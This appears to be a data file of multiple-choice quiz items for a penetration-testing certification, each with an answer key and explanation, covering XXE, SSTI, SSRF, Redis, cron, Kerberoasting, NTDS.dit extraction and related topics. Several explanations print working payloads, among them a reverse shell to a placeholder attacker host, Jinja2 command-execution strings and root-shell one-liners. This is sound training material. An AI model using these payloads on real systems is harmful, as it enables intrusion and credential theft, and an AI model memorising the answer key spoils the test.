    {id:"3-88",domain:"Web",difficulty:"hard",q:"A web application uses XML input and the server response includes content from a file referenced in the XML. What vulnerability is present and what is the next escalation step after file read is confirmed?",opts:["SQL injection via XML parameters; escalate to OS command execution","XML External Entity (XXE) injection; escalate to SSRF by changing file:// URI to http:// URI pointing to internal services","SSRF via the XML parser; escalate to RCE via internal service exploitation","XML injection enabling stored XSS; escalate to session hijacking"],ans:1,exp:"XXE (XML eXternal Entity) injection: when an XML parser processes user-supplied XML with DTD external entity references (<!ENTITY xxe SYSTEM 'file:///etc/passwd'>), it resolves the reference and includes file content in the response. Next escalation: use http:// URIs instead of file:// to probe internal services (SSRF chaining): <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>"},
    {id:"3-89",domain:"Web",difficulty:"medium",q:"Application takes a user-supplied 'template' parameter and renders it server-side. Submitting '{{7*7}}' returns 49. What template engine is confirmed vulnerable?",opts:["Twig (PHP); the {{}} syntax and arithmetic evaluation confirm Twig SSTI","Jinja2 (Python/Flask); the {{7*7}}=49 output confirms Jinja2 is evaluating arithmetic expressions in the template context","Django templates (Python); arithmetic in {{}} confirms Django template injection","Smarty (PHP); the {{7*7}} syntax is Smarty's expression syntax"],ans:1,exp:"Jinja2 SSTI fingerprinting: {{7*7}} returning 49 (not the literal string '{{7*7}}') confirms Jinja2 is evaluating expressions. Different template engines have different syntax: Twig uses {{7*7}}='49' too, Freemarker uses ${7*7}, Velocity uses #set($x=7*7)${x}. For Jinja2 specifically, try {{config}} to see Flask configuration. Then escalate to RCE."},
    {id:"3-90",domain:"Methodology",difficulty:"hard",q:"MongoDB instance on port 27017 without authentication storing customer PII. Under GDPR, what is the organisation's obligation (no confirmed breach)?",opts:["Notify ICO within 72 hours since exposed data constitutes a reportable breach","A vulnerability alone without confirmed exploitation does not trigger GDPR breach notification; organisation must remediate promptly and assess if unauthorised access occurred; internal documentation is necessary","Notify all data subjects whose data was potentially exposed within 30 days","GDPR only applies to EU organisations; UK post-Brexit has different notification thresholds"],ans:1,exp:"GDPR Article 33: notification to supervisory authority is required for personal data breaches (unauthorised access, acquisition, etc.). A misconfiguration (exposed but not necessarily accessed) is a near-miss/vulnerability. The organisation must: assess whether access occurred, document the near-miss, remediate immediately, implement access controls. If evidence of unauthorised access: notify ICO within 72 hours."},
    {id:"3-91",domain:"Web",difficulty:"hard",q:"Application uses SAML for SSO. XML signature covers only the Assertion element, not the entire Response. What attack is possible?",opts:["XML injection by modifying unsigned elements within the Response","SAML response wrapping attack: injecting a malicious Assertion alongside the legitimate signed one; some parsers accept the attacker's unsigned assertion","Signature stripping attack: removing the signature entirely","Replay attack using the captured assertion across different service providers"],ans:1,exp:"SAML XML Signature Wrapping (XSW): when only the Assertion (not the Response) is signed, an attacker can copy the signed Assertion, inject a malicious unsigned Assertion with different attributes (e.g., admin role), and reposition the signed Assertion. Vulnerable parsers find the signed element (valid) but evaluate the attacker's unsigned element for authorisation decisions."},
    {id:"3-92",domain:"Unix",difficulty:"hard",q:"Binary has 'cap_setuid+ep' set via getcap. Why is this equivalent to a SUID binary for privilege escalation?",opts:["Capabilities only apply to network operations; cap_setuid has no privilege escalation value","cap_setuid+ep allows the binary to call setuid(0) to change its effective UID to root, achieving root-level code execution","Capabilities are sandboxed and cannot escape the process namespace","cap_setuid only allows changing to UIDs below 1000, not to root"],ans:1,exp:"Linux capabilities on binaries: cap_setuid = ability to make setuid() syscalls. +ep = both Effective (active by default when binary runs) and Permitted sets. A binary with cap_setuid+ep can call setuid(0) even as a non-root user. Python3 example: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' — achieves root shell if python3 has cap_setuid+ep."},
    {id:"3-93",domain:"Methodology",difficulty:"medium",q:"A penetration tester identifies a WAF blocking most SQL injection payloads. A junior tester argues that a properly configured WAF makes SQL injection remediation in application code unnecessary. What is the fundamental flaw?",opts:["WAFs cannot detect SQL injection; only IDS systems can","WAFs can be bypassed through encoding/fragmentation/novel payloads; the underlying vulnerability remains; defence in depth requires fixing the root cause (parameterised queries) not just adding perimeter controls","WAFs introduce latency reducing security by creating a DoS risk","SQL injection only affects databases; WAFs protect the web tier so they are complementary"],ans:1,exp:"WAFs are supplementary controls, not replacements for secure coding. They can be bypassed (encoding tricks, comment insertion, fragmentation, HTTP smuggling, novel payloads). The underlying vulnerability is in the application code. Defence in depth: fix the code (parameterised queries) AND add WAF AND apply least-privilege database accounts. WAF alone is never sufficient."},
    {id:"3-94",domain:"Web",difficulty:"hard",q:"Python Flask app source: 'app.secret_key = \"dev\"'. Application uses Flask-Login. What is the security impact?",opts:["Secret key only used for CSRF token generation; session security not affected","Flask signs session cookies using the secret_key with HMAC-SHA1; a known/weak key allows forging session cookies with arbitrary data (e.g., is_admin:true) by signing them with the same key","Secret key encrypts session data; weak key allows brute force decryption but not forgery","Flask stores sessions server-side; secret_key only controls session ID which is random"],ans:1,exp:"Flask sessions are signed client-side cookies (not encrypted by default): base64(JSON payload) + HMAC-SHA1(secret_key). If the secret_key is known ('dev') or guessable, an attacker can: decode the existing cookie, modify the JSON (e.g., change user_id or add is_admin:True), re-sign with the known key, and submit the forged cookie. Use flask-unsign or create a custom script."},
    {id:"3-95",domain:"Networking",difficulty:"hard",q:"Unauthenticated Redis on TCP 6379. How to achieve OS-level code execution?",opts:["Redis CONFIG SET to modify running configuration to enable RCE","Redis CONFIG SET dir and dbfilename to write a cron job or SSH authorized_keys via SAVE, then wait for execution","Redis EVAL with Lua script calling OS system functions","Redis SLAVEOF to receive malicious RDB data containing shellcode"],ans:1,exp:"Redis RCE via filesystem writes: CONFIG SET dir /var/spool/cron/ sets the RDB save directory. CONFIG SET dbfilename root makes the RDB filename 'root'. Then: SET payload '\\n\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n' and BGSAVE saves this as a 'cron file' in /var/spool/cron/root. The cron daemon executes the reverse shell. Similar technique for authorized_keys."},
    {id:"3-96",domain:"Web",difficulty:"hard",q:"Application takes a user-supplied URL for image fetching. Submitting 'http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role' returns AWS credentials. What vulnerability is this?",opts:["Open redirect allowing attackers to steal OAuth tokens","Server-Side Request Forgery (SSRF): the application makes server-side HTTP requests to attacker-controlled URLs, enabling access to internal services and cloud metadata not accessible from outside","Remote File Inclusion: the URL is included and executed as server-side code","XML External Entity injection via URL parameter processing"],ans:1,exp:"Server-Side Request Forgery (SSRF): the application fetches URLs server-side on behalf of the user. By pointing this at the AWS metadata service (169.254.169.254), the attacker retrieves IAM credentials accessible only from within the EC2 instance. SSRF can also probe internal services (databases, admin panels) not accessible from the internet."},
    {id:"3-97",domain:"Post-Exploitation",difficulty:"hard",q:"Tester uses tcpdump to capture traffic: 'tcpdump -i eth0 -w capture.pcap host 192.168.1.1'. What protocol is identified if port 23 is observed communicating with cleartext credentials visible in the TCP stream?",opts:["SSH with a broken encryption implementation","Telnet; the protocol transmits all data including authentication credentials in cleartext over TCP port 23","rlogin using TCP port 23 in compatibility mode","HTTP basic auth downgraded to port 23 by a misconfigured proxy"],ans:1,exp:"TCP port 23 = Telnet. Telnet was the primary remote administration protocol before SSH but transmits EVERYTHING (including authentication) in cleartext. Capturing 'Password:' followed by the actual password string in a Wireshark TCP stream on port 23 is a classic Telnet credential capture. SSH (port 22) was designed as an encrypted replacement for Telnet."},
    {id:"3-98",domain:"Web",difficulty:"hard",q:"Application uses HTTP GET for credentials: 'http://app.com/login?user=admin&pass=secret'. Beyond interception in transit, what additional persistent risk exists?",opts:["GET parameters are processed server-side without logging, unlike POST","Credentials in GET parameters are recorded in server access logs, browser history, and proxy logs — creating persistent credential exposure","GET-based authentication is vulnerable to CSRF unlike POST-based forms","Server-side session tokens are embedded in GET parameters making them forgeable"],ans:1,exp:"GET parameters appear in: (1) server access logs (Apache/nginx log full URLs), (2) browser history and bookmarks, (3) Referer headers when navigating away (leaking to third-party sites), (4) proxy/CDN logs, (5) browser autocomplete. Even over HTTPS, credentials in URLs are a persistent exposure risk. POST parameters are not logged in standard access logs."},
    {id:"3-99",domain:"Networking",difficulty:"hard",q:"BGP misconfiguration: attacker announces 1.2.3.0/24 while legitimate owner has 1.2.0.0/16. What happens to traffic for 1.2.3.0/24?",opts:["Traffic load-balanced between legitimate and attacker routes","BGP longest-prefix match routes traffic to attacker's AS, enabling interception or blackholing","More specific route rejected since RFC 4271 prohibits /24 from untrusted peers","BGP ignores attacker's announcement since origin AS differs from registered owner"],ans:1,exp:"BGP longest-prefix match: more specific routes (/24 > /16) are preferred. An attacker who can announce 1.2.3.0/24 attracts all traffic destined for that /24. This is BGP hijacking — used for traffic interception, cryptocurrency theft (hijacking mining pool addresses), spam, or blackholing. RPKI (Resource Public Key Infrastructure) is the mitigation."},
    {id:"3-100",domain:"Methodology",difficulty:"medium",q:"CVSS v3 for a default MSSQL SA account with no password on an internet-facing server. Which base metric would be 'None'?",opts:["Attack Vector","Privileges Required","Authentication","User Interaction"],ans:3,exp:"For default SA with blank password, internet-facing: Attack Vector=Network, Complexity=Low, Privileges Required=None (no auth needed), User Interaction=None (automated exploitation possible), Scope=Changed, C/I/A=High → CVSS ~10.0 Critical. User Interaction=None since no human action is required to exploit the finding."},
    {id:"3-101",domain:"Windows",difficulty:"hard",q:"A Kerberoasting attack has been performed and a service ticket hash recovered. The target account's password policy requires minimum 12 characters with complexity. Which hashcat approach is MOST effective?",opts:["Brute force all 12-character combinations with full ASCII charset","Rules-based attack on a quality wordlist with capitalisation, leet substitution, and number/symbol appending rules","Standard dictionary attack against rockyou.txt without rules","Rainbow table lookup using a 12-character precomputed table"],ans:1,exp:"For real-world service account passwords with complexity requirements, rules-based attacks are most effective: they apply transforms like capitalise first letter, append numbers (1-999), append common symbols (!, @, #), leet substitutions. Service account passwords are often set by humans and follow predictable patterns like 'Service@2020' or 'Autumn2019!'. Raw brute force at 12+ characters is infeasible."},
    {id:"3-102",domain:"ActiveDirectory",difficulty:"hard",q:"An assessment finds LAPS (Local Administrator Password Solution) is NOT deployed on domain workstations. What specific risk does this create?",opts:["Without LAPS, local administrator accounts cannot be disabled","Without LAPS, all domain workstations likely share the same local administrator password; compromising one machine's local admin hash enables pass-the-hash lateral movement to all other workstations","Without LAPS, domain controllers cannot push Group Policy to workstations","Without LAPS, BitLocker recovery keys are stored insecurely"],ans:1,exp:"Without LAPS, the local Administrator account typically has the same password across all domain-joined workstations (set during imaging). Compromising one machine and extracting the local admin hash via hashdump/mimikatz enables pass-the-hash attacks against ALL other workstations. LAPS randomises and manages local administrator passwords per machine, preventing this lateral movement."},
    {id:"3-103",domain:"Networking",difficulty:"hard",q:"'ssh -D 9050 user@compromised'. What does the -D flag create?",opts:["A dynamic port forward creating a SOCKS proxy on port 9050 routing traffic through the SSH tunnel","A direct port forward from attacker port 9050 to the target network","A reverse tunnel from the compromised host to the attacker on port 9050","A dedicated X11 forwarding channel on port 9050"],ans:0,exp:"SSH -D creates a SOCKS proxy (dynamic port forwarding). All TCP connections made through SOCKS port 9050 are tunnelled through the SSH connection to the compromised host, which then makes final connections. Use with proxychains: proxychains nmap -sT target-internal. This enables scanning internal networks visible only from the compromised host."},
    {id:"3-104",domain:"Post-Exploitation",difficulty:"hard",q:"Post-exploitation finds a cron job: '*/5 * * * * root /opt/backup/backup.sh' and /opt/backup/backup.sh is world-writable. What is the exploitation path?",opts:["Modify backup.sh to include a reverse shell or privilege escalation command; wait up to 5 minutes for root to execute it","Copy backup.sh to /tmp, modify it, and replace the original","Use ptrace to inject code into the running backup.sh process","Replace the cron daemon with a malicious version"],ans:0,exp:"World-writable cron script owned by root = instant root access. Simply: echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup/backup.sh, then wait up to 5 minutes. Or add a reverse shell one-liner. The script runs as root due to the 'root' keyword in the cron job definition. Equivalent to direct crontab write access."},
    {id:"3-105",domain:"Web",difficulty:"hard",q:"An application generates session tokens using: token = MD5(username + timestamp). What vulnerability is present?",opts:["MD5 is not suitable for session tokens since it produces only 128-bit output","The token is predictable: if an attacker can observe a token and infer the timestamp, they can forge tokens for other users; MD5 is computationally fast enabling brute force","The timestamp introduces entropy that makes the token more secure than a random value","MD5 session tokens are vulnerable to length extension attacks if the server validates token integrity"],ans:1,exp:"Predictable session tokens: (1) If you observe your own token, you know your username, so you can brute force the timestamp (finite range), (2) Once you can compute the token formula, generate tokens for target usernames (admin, etc.) across a timestamp range, (3) MD5 is fast — 8B hashes/second on GPU makes this trivial. Session tokens must use cryptographically secure random values."},
    {id:"3-106",domain:"Web",difficulty:"medium",q:"'X-Frame-Options: SAMEORIGIN'. What attack does this specifically mitigate?",opts:["Cross-site scripting by preventing inline script injection","Clickjacking by preventing the page from being embedded in an iframe on a different origin","CSRF by blocking cross-origin form submissions","Open redirect by restricting navigation to same-origin URLs"],ans:1,exp:"X-Frame-Options: SAMEORIGIN instructs the browser to only allow the page to be framed by pages on the same origin. This prevents clickjacking attacks where an attacker frames your site in an invisible iframe to trick users into clicking UI elements. DENY would prevent all framing. Content-Security-Policy frame-ancestors is the modern equivalent."},
    {id:"3-107",domain:"Methodology",difficulty:"medium",q:"CREST assessment, testing window is 09:00-17:00 weekdays, it is 16:45 Friday. You find a critical RCE. What is correct?",opts:["Exploit the vulnerability to demonstrate impact before time expires","Document the vulnerability without exploiting it and immediately notify the client contact","Continue testing past 17:00 since the window was nearly complete","Attempt a PoC exploit that demonstrates the flaw without causing harm"],ans:1,exp:"Rules of Engagement must be strictly followed. If the window closes at 17:00, testing must stop at 17:00. A critical finding should be documented and the client notified immediately through the agreed emergency contact procedure. Exploiting out-of-hours violates the RoE and potentially the Computer Misuse Act. The finding can be validated in a subsequent authorised window."},
    {id:"3-108",domain:"Windows",difficulty:"medium",q:"During a Windows assessment you run 'enum -P 192.168.1.72' and see 'lockout threshold: none'. What attack becomes trivially feasible?",opts:["Pass-the-hash attacks using extracted NTLM hashes","Online brute force of credentials against SMB without risk of account lockout","Rainbow table attacks against the SAM database","Kerberoasting of service account tickets"],ans:1,exp:"No lockout threshold = unlimited password attempts via SMB without triggering lockouts. This makes online brute force (hydra -e ns against SMB) viable. Pass-the-hash and rainbow tables are offline attacks not prevented by lockout policy anyway. The source material covers this in the Password Policy section."},
    {id:"3-109",domain:"Unix",difficulty:"medium",q:"John the Ripper is used on a Unix system. The tester first runs '$unshadow pwd shd > run'. Why is this step necessary before running john?",opts:["John requires a specific file encoding that unshadow provides","unshadow combines /etc/passwd and /etc/shadow to create a single file with both username and hash that John requires","The shadow file contains only usernames; unshadow extracts the hash portion","John cannot read the colon-separated format of /etc/shadow without preprocessing"],ans:1,exp:"Modern Unix splits credentials: /etc/passwd (world-readable, has username/UID/shell) and /etc/shadow (root-readable, has the hash). John needs BOTH — the username for display and the hash for cracking. unshadow merges them into a single file in the old-style passwd format. The source shows the exact '$unshadow pwd shd > run' command then '$john run'."},
    {id:"3-110",domain:"Networking",difficulty:"medium",q:"An nmap SYN scan shows a port as 'filtered'. What BEST explains this state?",opts:["The port is open but the service is not responding to the nmap probe","No response received or ICMP unreachable returned, indicating a firewall is dropping packets","The port responded with SYN-ACK but no RST, indicating a proxy","The service requires authentication before accepting connections"],ans:1,exp:"nmap 'filtered' state means: (1) no response to the SYN probe (packet silently dropped by firewall), OR (2) ICMP type 3 unreachable (admin prohibited). Both indicate a firewall. 'Open' = SYN-ACK received. 'Closed' = RST received. 'Filtered' = no answer or ICMP unreachable = firewall present."},
    {id:"3-111",domain:"Web",difficulty:"hard",q:"A web application is vulnerable to SSTI (Server-Side Template Injection) in Flask/Jinja2. The payload '{{7*7}}' returns '49'. Which payload is used to achieve RCE?",opts:["{{system('id')}}","{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","{{exec('import os; os.system(\"id\")')}}","{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],ans:3,exp:"Jinja2 SSTI RCE payload traverses Python's object model: request.application.__globals__ accesses Flask's global namespace, __builtins__ accesses Python builtins, __import__('os') imports the os module, .popen('id').read() executes the command. The exact payload varies by Jinja2 version and security configuration."},
    {id:"3-112",domain:"Web",difficulty:"hard",q:"Application uses REST API with JWT. The server accepts the 'alg: none' algorithm in the JWT header. What vulnerability does this indicate?",opts:["The token is transmitted in plaintext and readable in transit","The server accepts tokens without signature validation if alg:none is specified, allowing arbitrary claim forgery","The token uses symmetric signing allowing the server to forge its own tokens","JWT with alg:none is standard for development environments and not exploitable in production"],ans:1,exp:"Some JWT libraries accept 'alg: none' as valid, meaning they skip signature verification entirely. An attacker can decode the header and payload, modify any claims (e.g., role:admin), re-encode with alg:none and empty signature — and the server accepts it. Libraries should explicitly reject alg:none for non-local tokens."},
    {id:"3-113",domain:"Cloud",difficulty:"hard",q:"During an AWS assessment, a tester finds an EC2 instance with IMDSv1 enabled and an SSRF vulnerability in the hosted application. The first request to 169.254.169.254/latest/meta-data/ returns a list of metadata paths. What is the most impactful subsequent request?",opts:["169.254.169.254/latest/meta-data/hostname — get the instance hostname","169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> — get temporary AWS credentials","169.254.169.254/latest/meta-data/instance-id — get the EC2 instance identifier","169.254.169.254/latest/meta-data/network/interfaces/ — enumerate network interfaces"],ans:1,exp:"The most impactful SSRF target on AWS EC2 is the IAM security credentials endpoint: /latest/meta-data/iam/security-credentials/<role-name>. This returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) that can be used to make AWS API calls with the instance's IAM permissions. If the role has broad permissions (e.g., AdministratorAccess), full AWS account takeover is possible."},
    {id:"3-114",domain:"Wireless",difficulty:"hard",q:"During a wireless assessment, a WPA2-PSK network is found. An attacker captures traffic but no 4-way handshake is observed. How can the attacker force a handshake capture without waiting?",opts:["Continuously broadcast probe requests for the target SSID","Send deauthentication frames to one or more clients forcing them to re-authenticate and thus generate a 4-way handshake","Inject a disassociation request to the AP causing all clients to reconnect simultaneously","Flood the AP with probe responses to trigger client reconnection"],ans:1,exp:"Forced deauthentication: using aireplay-ng -0 <count> -a <AP BSSID> -c <client MAC> mon0, the attacker sends spoofed deauth frames to clients connected to the target AP. Clients disconnect and automatically reconnect, generating a fresh 4-way handshake that is captured by airodump-ng. Without PMF (802.11w), this works on all WPA2-PSK networks."},
    {id:"3-115",domain:"Post-Exploitation",difficulty:"hard",q:"After obtaining SYSTEM on a Windows DC, which command using ntdsutil.exe creates an offline backup of NTDS.dit without copying the file directly?",opts:["ntdsutil \"ac in ntds\" \"ifm\" \"cr fu c:\\backup\" q q","ntdsutil backup ntds.dit c:\\backup\\ntds.dit","ntdsutil \"snapshot\" \"activate instance ntds\" \"create\" q q","ntdsutil \"ac instance ntds\" \"export c:\\backup\" q q"],ans:0,exp:"ntdsutil 'ifm' (Install From Media) creates a snapshot and exports NTDS.dit plus the SYSTEM registry hive to a specified directory. The sequence: ntdsutil, then 'activate instance ntds', then 'ifm', then 'create full c:\\backup'. The exported files can then be parsed offline using secretsdump.py or impacket to extract all domain hashes without needing to use VSS directly."},
    {id:"3-116",domain:"Web",difficulty:"hard",q:"A REST API endpoint accepts JSON and the server reflects back any unrecognised fields in the response. Submitting {\"username\":\"admin\",\"admin\":true} returns {\"username\":\"admin\",\"admin\":true,\"id\":1}. What vulnerability is present?",opts:["JSON injection: the admin field modifies the server-side admin status of the account","Mass assignment vulnerability: the application blindly binds all request properties to the server-side object; the 'admin' field may have actually been set on the server-side object","XSS via the reflected JSON content","SQL injection via the JSON field names"],ans:1,exp:"Mass assignment (auto-binding): the application takes all JSON properties from the request and binds them directly to the server-side object model. If the admin field is bound without a whitelist/blacklist, submitting admin:true may actually set the user's admin status to true in the database. Test by re-fetching the user object to see if the admin:true change persisted."},
    {id:"3-117",domain:"Cryptography",difficulty:"hard",q:"A developer claims their custom XOR cipher is secure because the key is 256 bits. Why is it insecure regardless of key length?",opts:["XOR cannot operate on binary data larger than 8 bits per operation","XOR ciphers are linear; with known plaintext/ciphertext pairs the key is trivially recoverable","XOR encryption is not reversible without the original plaintext","256-bit XOR keys have reduced effective keyspace due to birthday paradox"],ans:1,exp:"A repeating XOR stream cipher is linear — if you know any plaintext-ciphertext pair, XOR them to get the key segment (P XOR C = K). If the key repeats, aligning two ciphertexts and XORing eliminates the key (C1 XOR C2 = P1 XOR P2) enabling statistical attacks. One-time pad (XOR with truly random never-reused key) IS secure but custom XOR implementations never meet this standard."},
    {id:"3-118",domain:"Windows",difficulty:"hard",q:"You have RDP access to a locked-down Windows host with only a Notepad shortcut. Which sequence CORRECTLY escapes this restriction using ftp.exe?",opts:["Open Notepad, type 'ftp.exe', save as .bat, execute, then prefix commands with !","Open Notepad, use File > Open to browse to ftp.exe and execute it directly","Right-click the desktop, select Run, type ftp.exe","Use the Notepad print dialog to spawn cmd.exe as SYSTEM"],ans:0,exp:"Documented breakout technique: Notepad → type 'ftp.exe' → save as .bat → execute → from FTP shell, prefix OS commands with ! (e.g., !taskmgr.exe, !reg query). The FTP shell in Windows allows OS command execution via the ! prefix — a classic desktop breakout vector. Documented in the CREST CPSA source materials (Breakout 1 solution)."},
    {id:"3-119",domain:"Methodology",difficulty:"medium",q:"Why must timestamps be logged for each change made during a penetration test?",opts:["Timestamps are required by the Computer Misuse Act to prove authorisation","To enable the client to verify changes are within the authorised testing window and assist forensic analysis if test activities are confused with real attacks","CREST certification requires timestamped logs for post-exam submission","Timestamps help calculate billable hours for the engagement"],ans:1,exp:"Timestamped change logs serve two critical purposes: (1) demonstrate all activities occurred within the authorised engagement window (important if the client's SOC raises an incident), (2) help the incident response team distinguish test artefacts from real attacker actions during post-engagement forensic triage. This is professional due diligence."},
    {id:"3-120",domain:"Methodology",difficulty:"hard",q:"A penetration test reveals that a web application firewall is blocking most injection attempts. The junior tester says 'the WAF makes fixing the code unnecessary'. What should the senior tester recommend?",opts:["Agree — a well-tuned WAF provides equivalent protection to secure code","Disagree — WAFs can be bypassed and must be considered a supplementary control; the application code must be fixed with parameterised queries, prepared statements, and input validation as the primary defence","Agree — WAFs are more cost-effective than code remediation","Disagree — WAFs should be removed as they create a false sense of security and slow down response times"],ans:1,exp:"Defence in depth: WAFs are a valuable supplementary control but should never replace secure coding practices. WAF bypasses exist (encoding, fragmentation, novel payloads, HTTP smuggling). If the WAF fails or is misconfigured, the underlying vulnerability is still exploitable. The correct recommendation: (1) Fix the code — parameterised queries, (2) Add WAF as an additional layer, (3) Apply least-privilege database accounts. All three together constitute proper defence in depth."}
  ]
};
